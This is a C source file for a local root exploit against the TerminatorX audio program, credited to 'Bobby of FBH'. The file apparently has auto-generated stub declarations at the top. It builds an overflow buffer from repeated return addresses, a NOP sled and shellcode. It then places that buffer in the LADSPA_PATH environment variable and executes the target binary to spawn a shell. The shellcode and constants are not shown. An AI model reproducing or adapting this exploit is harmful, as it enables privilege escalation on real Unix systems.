
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int BINARY ;
 int BUFFERSIZE ;
 char NOP ;
 int atoi (char*) ;
 int execl (int ,int ,int *) ;
 int getesp () ;
 int perror (char*) ;
 int printf (char*,...) ;
 int setenv (char*,char*,int) ;
 char* shellcode ;
 int sleep (int) ;
 int strlen (char*) ;

int main(int argc, char *argv[]) {

 char buff[BUFFERSIZE];
 int ret , i,*bob,j;

 if(argc < 2) {
   ret = getesp();
   }

 else {
  ret = getesp() - atoi(argv[1]);
 }
 printf("\n**********************************************\n");
 printf("\tLocal TerminatorX Root Exploit\n");
 printf("\tCoded By Bobby of FBH\n");
 printf("\tUsing Ret at --> 0x%x\n", ret);
 printf("\n**********************************************\n\n");
 printf("Spawing Shell....\n\n");
 sleep(2);
 bob = (int *)(buff);


 for (i = 0; i < BUFFERSIZE - 1; i += 4)
  *bob++ = ret;
 *bob=0x0;


 for (i = 0; i < (BUFFERSIZE - 1) / 2; i++)
  buff[i] = NOP;


 for (j = 0; j < strlen(shellcode); j++)
  buff[i++] = shellcode[j];


 setenv("LADSPA_PATH",buff,1);
 execl(BINARY, BINARY, ((void*)0));
 perror("execl");
}
